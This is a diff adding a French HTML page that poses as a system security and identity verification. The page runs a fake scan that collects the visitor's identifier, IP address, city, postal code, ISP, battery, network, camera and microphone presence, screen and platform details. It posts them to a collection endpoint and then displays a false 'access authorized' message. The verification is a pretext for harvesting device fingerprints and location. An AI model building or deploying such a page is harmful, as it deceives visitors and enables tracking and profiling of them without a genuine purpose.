@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de Sécurité Système</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-glow: rgba(99, 102, 241, 0.4);
+            --bg-grad: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+            --glass: rgba(255, 255, 255, 0.05);
+            --glass-border: rgba(255, 255, 255, 0.1);
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-grad);
+            color: var(--text-main);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        /* Animation Background */
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(80px);
+            z-index: -1;
+            animation: float 10s infinite ease-in-out;
+        }
+        .orb-1 { width: 300px; height: 300px; background: #4f46e5; top: -50px; left: -50px; }
+        .orb-2 { width: 250px; height: 250px; background: #c026d3; bottom: -50px; right: -50px; animation-delay: 2s; }
+
+        @keyframes float {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, 50px); }
+        }
+
+        /* Card Design */
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            padding: 40px;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .icon-shield {
+            font-size: 48px;
+            margin-bottom: 20px;
+            background: -webkit-linear-gradient(#818cf8, #c084fc);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 8px; letter-spacing: -0.5px; }
+        p { color: var(--text-muted); font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
+
+        /* Inputs */
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { font-size: 12px; color: var(--text-muted); margin-left: 4px; display: block; margin-bottom: 6px; }
+        
+        input[type="text"] {
+            width: 100%;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--glass-border);
+            padding: 14px;
+            border-radius: 12px;
+            color: white;
+            font-family: inherit;
+            outline: none;
+            transition: 0.3s;
+        }
+        input[type="text"]:focus { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }
+
+        .check-wrapper {
+            display: flex;
+            align-items: center;
+            background: rgba(0,0,0,0.2);
+            padding: 12px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            font-size: 13px;
+            color: #cbd5e1;
+            cursor: pointer;
+            border: 1px solid transparent;
+            transition: 0.3s;
+        }
+        .check-wrapper:hover { border-color: var(--glass-border); }
+        .check-wrapper input { margin-right: 10px; accent-color: var(--primary); transform: scale(1.2); }
+
+        .btn-main {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--primary), #4f46e5);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .btn-main:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 20px -5px var(--primary-glow); }
+        .btn-main:disabled { opacity: 0.7; cursor: wait; transform: none; }
+
+        /* Overlay Scan */
+        .scan-overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(15, 23, 42, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .scan-overlay.active { opacity: 1; pointer-events: all; }
+
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .log-text { font-family: 'Courier New', monospace; font-size: 12px; color: var(--primary); margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="orb orb-1"></div>
+    <div class="orb orb-2"></div>
+
+    <div class="card">
+        <div class="scan-overlay" id="scanOverlay">
+            <div class="spinner"></div>
+            <div id="scanStatus">Initialisation...</div>
+            <div class="log-text" id="scanLog"></div>
+        </div>
+
+        <div class="icon-shield">🛡️</div>
+        <h1>Contrôle d'Identité</h1>
+        <p>Veuillez confirmer votre identité. Une analyse de votre environnement réseau sera effectuée pour valider l'accès.</p>
+
+        <div class="input-group">
+            <label>IDENTIFIANT</label>
+            <input type="text" id="username" placeholder="ex: jean.dupont@email.com" autocomplete="off">
+        </div>
+
+        <label class="check-wrapper">
+            <input type="checkbox" id="consent">
+            <span>J'autorise l'analyse complète (IP, Matériel, Réseau).</span>
+        </label>
+
+        <button id="submitBtn" class="btn-main" disabled>Lancer la Vérification</button>
+    </div>
+
+    <script>
+        const btn = document.getElementById('submitBtn');
+        const overlay = document.getElementById('scanOverlay');
+        const status = document.getElementById('scanStatus');
+        const log = document.getElementById('scanLog');
+        const checkbox = document.getElementById('consent');
+
+        checkbox.addEventListener('change', () => { btn.disabled = !checkbox.checked; });
+
+        const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+        const updateLog = (text) => log.innerText = "> " + text;
+
+        btn.addEventListener('click', async () => {
+            overlay.classList.add('active');
+            const username = document.getElementById('username').value;
+
+            try {
+                // 1. Matériel de base
+                status.innerText = "Collecte du matériel...";
+                updateLog(`CPU: ${navigator.hardwareConcurrency || '?'} Coeurs`);
+                await wait(800);
+                updateLog(`RAM: ${navigator.deviceMemory || '?'} Go`);
+                await wait(600);
+
+                // 2. IP et Géo
+                status.innerText = "Géolocalisation réseau...";
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                updateLog(`IP: ${ipData.ip}`);
+                await wait(800);
+                updateLog(`VILLE: ${ipData.city} (${ipData.country_code})`);
+                await wait(600);
+
+                // 3. Batterie
+                status.innerText = "Analyse énergétique...";
+                let batteryInfo = {};
+                if (navigator.getBattery) {
+                    const batt = await navigator.getBattery();
+                    batteryInfo = {
+                        level: Math.round(batt.level * 100) + "%",
+                        charging: batt.charging ? "En charge" : "Sur batterie"
+                    };
+                    updateLog(`BATTERIE: ${batteryInfo.level}`);
+                } else {
+                    batteryInfo = { level: "N/A", charging: "N/A" };
+                }
+                await wait(700);
+
+                // 4. Réseau
+                status.innerText = "Test de connexion...";
+                let netInfo = navigator.connection || { type: 'unknown', effectiveType: 'unknown', downlink: '?', rtt: '?' };
+                updateLog(`RESEAU: ${netInfo.effectiveType.toUpperCase()} (${netInfo.downlink} Mbps)`);
+                await wait(600);
+
+                // 5. Périphériques (Cam/Mic)
+                status.innerText = "Scan des périphériques...";
+                let devices = { cam: false, mic: false };
+                if (navigator.mediaDevices) {
+                    try {
+                        const deviceList = await navigator.mediaDevices.enumerateDevices();
+                        deviceList.forEach(d => {
+                            if(d.kind === 'videoinput') devices.cam = true;
+                            if(d.kind === 'audioinput') devices.mic = true;
+                        });
+                    } catch(e) {}
+                }
+                updateLog(`PERIPH: ${devices.cam ? 'WebCam' : 'Pas de Cam'} | ${devices.mic ? 'Micro' : 'Pas de Mic'}`);
+                await wait(500);
+
+                // 6. Envoi
+                status.innerText = "Envoi des rapports...";
+                
+                const finalPayload = {
+                    userInput: username,
+                    timestamp: new Date().toISOString(),
+                    ip: ipData.ip,
+                    city: ipData.city,
+                    region: ipData.region,
+                    country: ipData.country_name,
+                    postal: ipData.postal,
+                    isp: ipData.org,
+                    asn: ipData.asn,
+                    cpuCores: navigator.hardwareConcurrency,
+                    ram: navigator.deviceMemory,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    battery: batteryInfo,
+                    network: {
+                        type: netInfo.effectiveType,
+                        downlink: netInfo.downlink + " Mbps",
+                        rtt: netInfo.rtt + " ms"
+                    },
+                    media: { hasCamera: devices.cam, hasMicrophone: devices.mic },
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    platform: navigator.platform
+                };
+
+                await fetch('/api/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(finalPayload)
+                });
+
+                status.innerText = "Vérification Réussie.";
+                status.style.color = "#4ade80";
+                updateLog("ACCÈS AUTORISÉ");
+
+                setTimeout(() => { location.reload(); }, 2000);
+
+            } catch (error) {
+                status.innerText = "Erreur de connexion.";
+                status.style.color = "#ef4444";
+                updateLog("ECHEC: " + error.message);
+                console.error(error);
+            }
+        });
+    </script>
+</body>
+</html>
